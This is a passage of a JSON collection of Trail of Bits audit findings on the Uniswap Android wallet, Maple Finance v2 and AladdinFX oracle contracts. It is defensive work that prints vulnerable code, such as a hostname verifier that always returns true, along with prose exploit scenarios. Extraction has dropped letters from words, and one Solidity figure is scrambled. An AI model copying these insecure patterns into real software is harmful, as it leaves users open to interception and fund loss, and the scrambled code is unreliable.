        "body": "The Uniswap Android mobile wallet decrypts data stored in encrypted shared preferences and caches the data in the wallet process memory. The cache is implemented in the RnEthersRs class (gure 14.1). The data contains plaintext private keys. Therefore, plaintext private keys may be kept unencrypted in RAM until the application is closed, even when the phone is locked. private fun retrieveOrCreateWalletForAddress(address: String): Long { val wallet = walletCache[address] if (wallet != null) { return wallet } val privateKey = retrievePrivateKey(address) val newWallet = walletFromPrivateKey(privateKey) walletCache[address] = newWallet return newWallet } Figure 14.1: The method of the RnEthersRs class that caches private keys in memory ([redacted]) The issue is informational because the wallet React application creates new instances of the RnEthersRs class on-demand (e.g., as shown in gure 14.2); therefore, the cache implemented by the class is short-living. However, this behavior invalidates the benets of having a cache, so it may be assumed that the intended use of the RnEthersRs class is to be a singleton. Moreover, the class is registered as a native module (gure 14.3), which again indicates that the class was intended to be a singleton. val ethersRs = RnEthersRs(reactContext) Figure 14.2: Example use of the RnEthersRs class ([redacted]) override fun createNativeModules( reactContext: ReactApplicationContext ): List<NativeModule> = listOf( RNEthersRSModule(reactContext), ThemeModule(reactContext), ) Figure 14.3: The RnEthersRs class is registered as a native module. ([redacted]) Exploit Scenario An attacker steals a users phone but cannot unlock it. He exltrates the RAM content, which contains the users private keys. The attacker uses the private key to take over the users wallet and drain her funds. Recommendations Short term, remove the cache mechanism from the RnEthersRs class so that data stored in encrypted shared preferences is decrypted only on demand. Long term, ensure that the application decrypts sensitive data only when it is needed (e.g., to sign a transaction or to display the wallet mnemonic) and removes it from RAM when it is no longer needed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Wallet sends requests with private data before the application is unlocked ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "When the application launches while still awaiting to be unlocked by biometric or PIN authentication, the application starts fetching prole information over the network. This leads to the disclosure of information about the wallet registered in the application without needing to unlock it rst. The wallet information is public, but associating a device or application instance with an account without needing to unlock the application is still a privacy issue. Requests sent before the wallet is unlocked go to the api.uniswap.org endpoint, which contains operations like TransactionList and PortfolioBalances as well as the addresses of the currently registered mnemonic. Recommendations Short term, do not send HTTP requests before the application is unlocked.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Biometric is not enabled for application access after enrollment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "There are two settings for biometric authentication in the Uniswap mobile wallet: application access and transaction signing. When enabling biometric authentication during initial application enrollment, only the latter is enabled, and users are not informed that they should explicitly enable the other biometric setting. Figure 16.1: Default settings for biometric authentication after initial enrollment This issue is only informational because it is the wallet users responsibility to congure the wallet securely. Nevertheless, implementing the recommendations provided below would make the application more secure by default, or at least would increase users awareness of the security-relevant congurations. Exploit Scenario Alice installs the Uniswap mobile wallet application and enables biometric authentication during initial enrollment. She is unaware that biometric authentication was enabled only for transaction signing and that there is a separate setting for application access. She views her mnemonic, authorizing access with a ngerprint. She then moves the wallet application to the background and uses other applications. Suddenly, Bob grabs Alices phone, runs, and later moves the wallet application to the foreground. Since the application access setting is not enabled, he can see the plaintext mnemonic and steals Alices funds. Recommendations Short term, enable both biometric authentication requirements (application access and transaction signing) when the user has enabled biometric authentication during the initial enrollment process. Alternatively, inform the user that they should manually enable the application access setting.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. An insecure HostnameVerier that disables SSL hostname validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The NoopHostnameVerifier class in the org.apache.http.conn.ssl package denes a HostnameVerifier() method that does not validate the servers hostname (gure 22.1). This allows an attacker to perform a PITM attack on a user's connection to spoof the server with the users hostname by providing a certicate from another host. Due to the lack of hostname verication, the client would accept this certicate. It is important to note that, according to the policy, Beginning March 1, 2017, Google Play will block publishing of any new apps or updates that use an unsafe implementation of HostnameVerifier. package org.apache.http.conn.ssl; import javax.net.ssl.HostnameVerifier; import javax.net.ssl.SSLSession; /* loaded from: classes5.dex */ public class NoopHostnameVerifier implements HostnameVerifier { public static final NoopHostnameVerifier INSTANCE = new NoopHostnameVerifier(); public final String toString() { return \"NO_OP\"; } @Override // javax.net.ssl.HostnameVerifier public boolean verify(String str, SSLSession sSLSession) { return true; } } Figure 22.1: The decompiled NoopHostnameVerifier class in the jadx-gui tool The issue is of informational severity because we were unable to exploit this nding by using a certicate signed by a valid CA but for invalid hostnames. In this case, logcat shows an SSL error. Exploit Scenario From the users perspective: An attacker carries out a PITM attack by using a CA-signed certicate issued for a domain the attacker owns. Because the implementation of the HostnameVerifier method accepts any certicate signed by a valid CA for any hostname, the attackers certicate is accepted. From the application owners perspective: The application is removed from or is blocked from being published in Google Play because of the unsafe implementation of the HostnameVerifier method, which does not validate hostnames. Recommendations Short term, identify which library introduces the vulnerable code and follow potential xes to ensure that the Uniswap mobile wallet uses the default hostname validation logic or that the custom HostnameVerifier interface returns false when the servers hostname does not meet the expected value. References  Google Help: How to resolve Insecure HostnameVerier",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "23. Sentry SDK uses getRunningAppProcesses to get a list of running apps ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "The Sentry SDK uses the getRunningAppProcesses method (gure 23.1), which is intended only for debugging or building a user-facing process management the UI. Also, the Android Security 2014 Year in Review Google report states that, Throughout 2014, we have regularly tightened the denition of Spyware, for example in 2014 we began to classify applications that send the list of other applications on the device as Spyware. This may cause the Uniswap mobile application to be removed from the store. Figure 23.1: Part of the io.sentry.android.core package that uses the getRunningAppProcesses method The issue remains open on the Sentry GitHub: Issue #2187, Consider removing function call: ActivityManager.getRunningAppProcesses(). Recommendations Short term, refer to Sentry to get information about when the isForegroundImportance is nally updated, or consider removing the Sentry SDK from the Uniswap wallet. Long term, periodically review other usages of the getRunningAppProcesses method using the jadx-gui tool on the production release APK.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "26. Leakage of data to third-party ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-uniswap-wallet-securityreview.pdf",
        "body": "We found that the Uniswap mobile wallet shares device-specic information with third-party entities, including OneSignal, Sentry, and Google Services. This practice poses privacy risks, as the shared data encompasses attributes such as time zone, device model, OS version, and Advertising Identier. For instance, the application sends requests with the data shown in gure 26.1 to the OneSignal API: POST https://api.onesignal.com/players SDK-Version: onesignal/android/040805 Accept: application/vnd.onesignal.v1+json Content-Type: application/json; charset=UTF-8 Content-Length: 500 User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3a Build/QQ1A.191205.011) {\"app_id\":\"5b27c29c-281e-4cc4-8659-a351d97088b0\",\"device_os\":\"dt.osv.11\",\"timezone\": -14400,\"timezone_id\":\"America\\/New_York\",\"language\":\"en\",\"sdk\":\"040805\",\"sdk_type\":\" react\",\"android_package\":\"com.uniswap\",\"device_model\":\"Pixel 4\",\"game_version\":1000001,\"net_type\":0,\"carrier\":\"DT_Carrier\",\"rooted\":true,\"identif ier\":\"etFD-KouTlWyiNLnbq-kwR:APA91bGRu1ougP1RVPB4nJoLNr3iIrZ0s6hN44btOIGF-xt592HeKch Z89rnn7PeGhK00a5XTu-NdRk_t0wps69JJkWfgZCTdFyy3uSEU6WG_zJUCA79uBL5TH-i206OeX35BM-Nbm7 3\",\"device_type\":1} Figure 26.1: Example request from the Uniswap mobile wallet to the OneSignal API Exploit Scenario An attacker intercepts data transmitted by the Uniswap mobile wallet, which includes information about the users device model, carrier, and physical location. Using this data, the adversary creates a highly targeted phishing attack that appears to be a legitimate communication from Uniswap or the identied carrier. The communication directs the user to a convincingly mimicked import wallet page. Unaware of the malicious redirect, the user enters his mnemonics. With this information, the attacker gains access to the user's account on Uniswap and outright steals the user's funds. Recommendations Short term, if sending device details to the parties is desired, include a comprehensive overview of this data-sharing practice in the applications privacy policy. If not, congure relevant SDKs to not share redundant user data or remove specic SDKs from the Uniswap mobile wallet codebase if they are not needed. Long term, periodically perform network analysis via Burp Suite Professional to monitor and verify the type of data transmitted to third parties. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Incorrect argument passed to _getPlatformOriginationFee ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The getOriginationFees function incorrectly uses msg.sender instead of the loan_ parameter. As a result, it returns an incorrect result to users who want to know how much a loan is paying in origination fees. function getOriginationFees(address loan_, uint256 principalRequested_) external view override returns (uint256 originationFees_) { originationFees_ = _getPlatformOriginationFee(msg.sender, principalRequested_) + delegateOriginationFee[msg.sender]; } Figure 1.1: getOriginationFees function (loan/contracts/MapleLoanFeeManager.sol#147-149) Exploit Scenario Bob, a borrower, wants to see how much his loan is paying in origination fees. He calls getOriginationFees but receives an incorrect result that does not correspond to what the loan actually pays. Recommendations Short term, correct the getOriginationFees function to use loan_ instead of msg.sender. Long term, add tests for view functions that are not used inside the protocol but are intended for the end-users.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. The protocol could stop working prematurely ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The _uint48 function is incorrectly implemented such that it requires the input to be less than or equal to type(uint32).max instead of type(uint48).max. This could lead to the incorrect reversion of successful executions. function _uint48(uint256 input_) internal pure returns (uint32 output_) { require(input_ <= type(uint32).max, \"LM:UINT32_CAST_OOB\"); output_ = uint32(input_); } Figure 2.1: _uint48 function (pool-v2/contracts/LoanManager.sol#774-777) The function is mainly used to keep track of when each loans payment starts and when it is due. All variables for which the result of _uint48 is assigned are eectively of uint48 type. Exploit Scenario The protocol stops working when we reach a block.timestamp value of type(uint32).max instead of the expected behavior to work until the block.timestamp reaches a value of type(uint48).max. Recommendations Short term, correct the _uint48 implementation by checking that the input_ is less than the type(uint48).max and that it returns an uint48 type. Long term, improve the unit-tests to account for extreme but valid states that the protocol supports. 3. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-MPL-3 Target: globals-v2/contracts/MapleGlobals.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Incorrect GovernorshipAccepted event argument ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The MapleGlobals contract emits the GovernorshipAccepted event with an incorrect previous owner value. MapleGlobals implements a two-step process for ownership transfer in which the current owner has to set the new governor, and then the new governor has to accept it. The acceptGovernor function rst sets the new governor with _setAddress and then emits the GovernorshipAccepted event with the rst argument dened as the old governor and the second the new one. However, because the admin() function returns the current value of the governor, both arguments will be the new governor. function acceptGovernor() external { require(msg.sender == pendingGovernor, \"MG:NOT_PENDING_GOVERNOR\"); _setAddress(ADMIN_SLOT, msg.sender); pendingGovernor = address(0); emit GovernorshipAccepted(admin(), msg.sender); } Figure 4.1: acceptGovernor function (globals-v2/contracts/MapleGlobals.sol#87-92) Exploit Scenario The Maple team decides to transfer the MapleGlobals governor to a new multi-signature wallet. The team has a script that veries the correct execution by checking the events emitted; however, this script creates a false alert because the GovernorshipAccepted event does not have the expected arguments. Recommendations Short term, emit the GovernorshipAccepted event before calling _setAddress. Long term, add tests to check the events have the expected arguments.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Partially incorrect Chainlink price feed safety checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The getLatestPrice function retrieves a specic asset price from Chainlink. However, the price (a signed integer) is rst checked that it is non-zero and then is cast to an unsigned integer with a potentially negative value. An incorrect price would temporarily aect the expected amount of fund assets during liquidation. function getLatestPrice(address asset_) external override view returns (uint256 latestPrice_) { // If governor has overridden price because of oracle outage, return overridden price. if (manualOverridePrice[asset_] != 0) return manualOverridePrice[asset_]; ( uint80 roundId_, int256 price_, , uint256 updatedAt_, uint80 answeredInRound_ ) = IChainlinkAggregatorV3Like(oracleFor[asset_]).latestRoundData(); require(updatedAt_ != 0, \"MG:GLP:ROUND_NOT_COMPLETE\"); require(answeredInRound_ >= roundId_, \"MG:GLP:STALE_DATA\"); require(price_ != int256(0), \"MG:GLP:ZERO_PRICE\"); latestPrice_ = uint256(price_); } Figure 5.1: getLatestPrice function (globals-v2/contracts/MapleGlobals.sol#297-308) Exploit Scenario Chainlinks oracle returns a negative value for an in-process liquidation. This value is then unsafely cast to an uint256. The expected amount of fund assets from the protocol is incorrect, which prevents liquidation. Recommendations Short term, check that the price is greater than 0. Long term, add tests for the Chainlink price feed with various edge cases. Additionally, set up a monitoring system in the event of unexpected market failures. A Chainlink oracle can have a minimum and maximum value, and if the real price is outside of that range, it will not be possible to update the oracle; as a result, it will report an incorrect price, and it will be impossible to know this on-chain.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Incorrect implementation of EIP-4626 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The Pool implementation of EIP-4626 is incorrect for maxDeposit and maxMint because these functions do not consider all possible cases in which deposit or mint are disabled. EIP-4626 is a standard for implementing tokenized vaults. In particular, it species the following:  maxDeposit: MUST factor in both global and user-specic limits. For example, if deposits are entirely disabled (even temporarily), it MUST return 0.  maxMint: MUST factor in both global and user-specic limits. For example, if mints are entirely disabled (even temporarily), it MUST return 0. The current implementation of maxDeposit and maxMint in the Pool contract directly call and return the result of the same functions in PoolManager (gure 6.1). As shown in gure 6.1, both functions rely on _getMaxAssets, which correctly checks that the liquidity cap has not been reached and that deposits are allowed and otherwise returns 0. However, these checks are insucient. function maxDeposit(address receiver_) external view virtual override returns (uint256 maxAssets_) { maxAssets_ = _getMaxAssets(receiver_, totalAssets()); } function maxMint(address receiver_) external view virtual override returns (uint256 maxShares_) { uint256 totalAssets_ = totalAssets(); uint256 totalSupply_ = IPoolLike(pool).totalSupply(); uint256 maxAssets_ = _getMaxAssets(receiver_, totalAssets_); maxShares_ = totalSupply_ == 0 ? maxAssets_ : maxAssets_ * totalSupply_ / totalAssets_; } [...] function _getMaxAssets(address receiver_, uint256 totalAssets_) internal view returns (uint256 maxAssets_) { bool depositAllowed_ = openToPublic || isValidLender[receiver_]; uint256 liquidityCap_ = liquidityCap; maxAssets_ = liquidityCap_ > totalAssets_ && depositAllowed_ ? liquidityCap_ - totalAssets_ : 0; } Figure 6.1: The maxDeposit and maxMint functions (pool-v2/contracts/PoolManager.sol#L451-L461) and the _getMaxAssets function (pool-v2/contracts/PoolManager.sol#L516-L520) The deposit and mint functions have a checkCall modier that will call the canCall function in the PoolManager to allow or disallow the action. This modier rst checks if the global protocol pause is active; if it is not, it will perform additional checks in _canDeposit. For this issue, it will be impossible to deposit or mint if the Pool is not active. function canCall(bytes32 functionId_, address caller_, bytes memory data_) external view override returns (bool canCall_, string memory errorMessage_) { if (IMapleGlobalsLike(globals()).protocolPaused()) { return (false, \"PM:CC:PROTOCOL_PAUSED\"); } if (functionId_ == \"P:deposit\") { ( uint256 assets_, address receiver_ ) = abi.decode(data_, (uint256, address)); } return _canDeposit(assets_, receiver_, \"P:D:\"); if (functionId_ == \"P:depositWithPermit\") { ( uint256 assets_, address receiver_, , , , ) = abi.decode(data_, (uint256, address, uint256, uint8, bytes32, bytes32)); return _canDeposit(assets_, receiver_, \"P:DWP:\"); } if (functionId_ == \"P:mint\") { ( uint256 shares_, address receiver_ ) = abi.decode(data_, (uint256, address)); \"P:M:\"); } return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, if (functionId_ == \"P:mintWithPermit\") { ( uint256 shares_, address receiver_, , , , , ) = abi.decode(data_, (uint256, address, uint256, uint256, uint8, bytes32, bytes32)); return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, \"P:MWP:\"); } [...] function _canDeposit(uint256 assets_, address receiver_, string memory errorPrefix_) internal view returns (bool canDeposit_, string memory errorMessage_) { if (!active) return (false, _formatErrorMessage(errorPrefix_, \"NOT_ACTIVE\")); if (!openToPublic && !isValidLender[receiver_]) return (false, _formatErrorMessage(errorPrefix_, \"LENDER_NOT_ALLOWED\")); if (assets_ + totalAssets() > liquidityCap) return (false, _formatErrorMessage(errorPrefix_, \"DEPOSIT_GT_LIQ_CAP\")); return (true, \"\"); } Figure 6.2: The canCall function (pool-v2/contracts/PoolManager.sol#L370-L393), and the _canDeposit function (pool-v2/contracts/PoolManager.sol#L498-L504) The maxDeposit and maxMint functions should return 0 if the global protocol pause is active or if the Pool is not active; however, these cases are not considered. Exploit Scenario A third-party protocol wants to deposit into Maples pool. It rst calls maxDeposit to obtain the maximum amount of asserts it can deposit and then calls deposit. However, the latter function call will revert because the protocol is paused. Recommendations Short term, return 0 in maxDeposit and maxMint if the protocol is paused or if the pool is not active. Long term, maintain compliance with the EIP specication being implemented (in this case, EIP-4626).",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. setAllowedSlippage and setMinRatio functions are unreachable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The administrative functions setAllowedSlippage and setMinRatio have a requirement that they can be called only by the poolManager. However, they are not called by any reachable function in the PoolManager contract. function setAllowedSlippage(address collateralAsset_, uint256 allowedSlippage_) external override { require(msg.sender == poolManager, \"LM:SAS:NOT_POOL_MANAGER\"); require(allowedSlippage_ <= HUNDRED_PERCENT, \"LM:SAS:INVALID_SLIPPAGE\"); emit AllowedSlippageSet(collateralAsset_, allowedSlippageFor[collateralAsset_] = allowedSlippage_); } function setMinRatio(address collateralAsset_, uint256 minRatio_) external override { require(msg.sender == poolManager, \"LM:SMR:NOT_POOL_MANAGER\"); emit MinRatioSet(collateralAsset_, minRatioFor[collateralAsset_] = minRatio_); } Figure 7.1: setAllowedSlippage and setMinRatio function (pool-v2/contracts/LoanManager.sol#L75-L85) Exploit Scenario Alice, a pool administrator, needs to adjust the slippage parameter of a particular collateral token. Alices transaction reverts since she is not the poolManager contract address. Alice checks the PoolManager contract for a method through which she can set the slippage parameter, but none exists. Recommendations Short term, add functions in the PoolManager contract that can reach setAllowedSlippage and setMinRatio on the LoanManager contract. Long term, add unit tests that validate all system parameters can be updated successfully.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Inaccurate accounting of unrealizedLosses during default warning revert ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "During the process of executing the removeDefaultWarning function, an accounting discrepancy fails to decrement netLateInterest from unrealizedLosses, resulting in an over-inated value. The triggerDefaultWarning function updates unrealizedLosses with the defaulting loans principal_, netInterest_, and netLateInterest_ values. emit UnrealizedLossesUpdated(unrealizedLosses += _uint128(principal_ + netInterest_ + netLateInterest_)); Figure 8.1: The triggerDefaultWarning function (pool-v2/contracts/LoanManager.sol#L331) When the warning is removed by the _revertDefaultWarning function, only the values of the defaulting loans principal and interest are decremented from unrealizedLosses. This leaves a discrepancy equal to the amount of netLateInterest_. function _revertDefaultWarning(LiquidationInfo memory liquidationInfo_) internal { accountedInterest -= _uint112(liquidationInfo_.interest); unrealizedLosses -= _uint128(liquidationInfo_.principal + liquidationInfo_.interest); } Figure 8.2: The _revertDefaultWarning function (pool-v2/contracts/LoanManager.sol#L631-L634) Exploit Scenario Alice has missed several interest payments on her loan and is about to default. Bob, the poolManager, calls triggerDefaultWarning on the loan to account for the unrealized loss in the system. Alice makes a payment to bring the loan back into good standing, the claim function is triggered, and _revertDefaultWarning is called to remove the unrealized loss from the system. The net value of Alices loans late interest value is still accounted for in the value of unrealizedLosses. From then on, when users call Pool.withdraw, they will have to exchange more shares than are due for the same amount of assets. Recommendations Short term, add the value of netLateInterest to the amount decremented from unrealizedLosses when removing the default warning from the system. Long term, implement robust unit-tests and fuzz tests to validate math and accounting ows throughout the system to account for any unexpected accounting discrepancies.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Attackers can prevent the pool manager from nishing liquidation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The finishCollateralLiquidation function requires that a liquidation is no longer active. However, an attacker can prevent the liquidation from nishing by sending a minimal amount of collateral token to the liquidator address. function finishCollateralLiquidation(address loan_) external override nonReentrant returns (uint256 remainingLosses_, uint256 platformFees_) { require(msg.sender == poolManager, \"LM:FCL:NOT_POOL_MANAGER\"); require(!isLiquidationActive(loan_), \"LM:FCL:LIQ_STILL_ACTIVE\"); [...] if (toTreasury_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, mapleTreasury(), toTreasury_); if (toPool_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, pool, toPool_); if (recoveredFunds_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, ILoanLike(loan_).borrower(), recoveredFunds_); Figure 9.1: An excerpt of the finishCollateralLiquidation function (pool-v2/contracts/LoanManager.sol#L199-L232) The finishCollateralLiquidation function uses the isLiquidationActive function to verify if the liquidation process is nished by checking the collateral asset balance of the liquidator address. Because anyone can send tokens to that address, it is possible to make isLiquidationActive always return false. function isLiquidationActive(address loan_) public view override returns (bool isActive_) { address liquidatorAddress_ = liquidationInfo[loan_].liquidator; // TODO: Investigate dust collateralAsset will ensure `isLiquidationActive` is always true. isActive_ = (liquidatorAddress_ != address(0)) && (IERC20Like(ILoanLike(loan_).collateralAsset()).balanceOf(liquidatorAddress_) != uint256(0)); } Figure 9.2: The isLiquidationActive function (pool-v2/contracts/LoanManager.sol#L702-L707) Exploit Scenario Alice's loan is being liquidated. Bob, the pool manager, tries to call finishCollateralLiquidation to get back the recovered funds. Eve front-runs Bobs call by sending 1 token of the collateral asset to the liquidator address. As a consequence, Bob cannot recover the funds. Recommendations Short term, use a storage variable to track the remaining collateral in the Liquidator contract. As a result, the collateral balance cannot be manipulated through the transfer of tokens and can be safely checked in isLiquidationActive. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. WithdrawalManager can have an invalid exit conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The setExitConfig function sets the conguration to exit from the pool. However, unsafe casting allows this function to set an invalid conguration. The function performs a few initial checks; for example, it checks that windowDuration is not 0 and that windowDuration is less than cycleDuration. However, when setting the conguration, the initialCycleId_, initialCycleTime_, cycleDuration_, and windowDuration_ are unsafely casted to uint64 from uint256. In particular, cycleDuration_ and windowDuration_ are user-controlled by the poolDelegate. function setExitConfig(uint256 cycleDuration_, uint256 windowDuration_) external override { CycleConfig memory config_ = _getCurrentConfig(); require(msg.sender == poolDelegate(), \"WM:SEC:NOT_AUTHORIZED\"); require(windowDuration_ != 0, \"WM:SEC:ZERO_WINDOW\"); require(windowDuration_ <= cycleDuration_, \"WM:SEC:WINDOW_OOB\"); require( cycleDuration_ != config_.cycleDuration || windowDuration_ != config_.windowDuration, \"WM:SEC:IDENTICAL_CONFIG\" ); [...] cycleConfigs[latestConfigId_] = CycleConfig({ initialCycleId: uint64(initialCycleId_), initialCycleTime: uint64(initialCycleTime_), cycleDuration: uint64(cycleDuration_), windowDuration: uint64(windowDuration_) }); } Figure 10.1: The setExitConfig function (withdrawal-manager/contracts/WithdrawalManager.sol#L83-L115) Exploit Scenario Bob, the pool delegate, calls setExitCong with cycleDuration_ equal to type(uint64).max + 1 and windowDuration_ equal to type(uint64).max. The checks pass, but the conguration does not adhere to the invariant windowDuration <= cycleDuration. Recommendations Short term, safely cast the variables when setting the conguration to avoid any possible errors. Long term, improve the unit-tests to check that important invariants always hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Loan can be impaired when the protocol is paused ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The impairLoan function allows the poolDelegate or governor to impair a loan when the protocol is paused due to a missing whenProtocolNotPaused modier. The role of this function is to mark the loan at risk of default by updating the loans nextPaymentDueDate. Although it would be impossible to default the loan in a paused state (because the triggerDefault function correctly has the whenProtocolNotPaused modier), it is unclear if the other state variable changes would be a problem in a paused system. Additionally, if the protocol is unpaused, it is possible to call removeLoanImpairment and restore the loans previous state. function impairLoan(address loan_) external override { bool isGovernor_ = msg.sender == governor(); require(msg.sender == poolDelegate || isGovernor_, \"PM:IL:NOT_AUTHORIZED\"); ILoanManagerLike(loanManagers[loan_]).impairLoan(loan_, isGovernor_); emit LoanImpaired(loan_, block.timestamp); } Figure 11.1: The impairLoan function (pool-v2/contracts/PoolManager.sol#L307-315) Exploit Scenario Bob, the MapleGlobal security admin, sets the protocol in a paused state due to an unknown occurrence, expecting the protocols state to not change and debugging the possible issue. Alice, a pool delegate who does not know that the protocol is paused, calls impairLoan, thereby changing the state and making Bobs debugging more dicult. Recommendations Short term, add the missing whenProtocolNotPaused modier to the impairLoan function. Long term, improve the unit-tests to check for the correct system behavior when the protocol is paused and unpaused. Additionally, integrate the Slither script in appendix D into the development workow.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Fee treasury could go to the zero address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "body": "The _disburseLiquidationFunds and _distributeClaimedFunds functions, which send the fees to the various actors, do not check that the mapleTreasury address was set. Althoughthe mapleTreasury address is supposedly set immediately after the creation of the MapleGlobals contract, no checks prevent sending the fees to the zero address, leading to a loss for Maple. function _disburseLiquidationFunds(address loan_, uint256 recoveredFunds_, uint256 platformFees_, uint256 remainingLosses_) internal returns (uint256 updatedRemainingLosses_, uint256 updatedPlatformFees_) { [...] require(toTreasury_ == 0 || ERC20Helper.transfer(fundsAsset_, mapleTreasury(), toTreasury_), \"LM:DLF:TRANSFER_MT_FAILED\"); Figure 12.1: The _disburseLiquidationFunds function (pool-v2/contracts/LoanManager.sol#L566-L584) Exploit Scenario Bob, a Maple admin, sets up the protocol but forgets to set the mapleTreasury address. Since there are no warnings, the expected claim or liquidation fees are sent to the zero address until the Maple team notices the issue. Recommendations Short term, add a check that the mapleTreasury is not set to address zero in _disburseLiquidationFunds and _distributeClaimedFunds. Long term, improve the unit and integration tests to check that the system behaves correctly both for the happy case and the non-happy case.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Missing event emission ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf",
        "body": "The critical operation updateOnchainSpotEncodings does not emit an event. Having an event emitted to reect changes to this critical storage variable will allow other system/o-chain components to detect suspicious behavior in the system. 88 function updateOnchainSpotEncodings ( bytes memory encodings) external onlyOwner { // validate encoding uint256 [] memory prices = _getSpotPriceByEncoding(encodings); if (prices.length == 0 ) revert(); 89 90 91 92 93 onchainSpotEncodings_BTCDerivativeUSD = encodings; 94 } Figure 1.1: The updateOnchainSpotEncodings function in FxBTCDerivativeOracleBase.sol#L88-L94 Events generated during contract execution aid in monitoring, baselining of behavior, and detecting suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. Recommendations Short term, emit an event in the updateOnchainSpotEncodings function. Long term, ensure all state-changing operations are always accompanied by events. In addition, use static analysis tools such as Slither to help prevent such issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Missing zero-address checks in constructors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-aladdinfx-oracle-securityreview.pdf",
        "body": "None of the constructors in the various oracle contracts validate that their address arguments do not equal the zero address. As a result, important immutable state variables might be set to the zero address during deployment, eectively making the given contract unusable and requiring a redeployment. 34 constructor ( address _Chainlink_BTC_USD_Twap ) { 35 Chainlink_BTC_USD_Twap = _Chainlink_BTC_USD_Twap; 36 37 _updateMaxPriceDeviation(1e16); // 1% 38 } Figure 2.1: The constructor in FxBTCDerivativeOracleBase.sol#L34-L38 18 address public immutable Chainlink_BTC_USD_Twap; Figure 2.2: The Chainlink_BTC_USD_Twap variable in FxBTCDerivativeOracleBase.sol#L18 Recommendations Short term, add a check to each constructor to ensure that each address argument does not equal the zero address. Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts.",
        "labels": [
            "Trail of Bits",
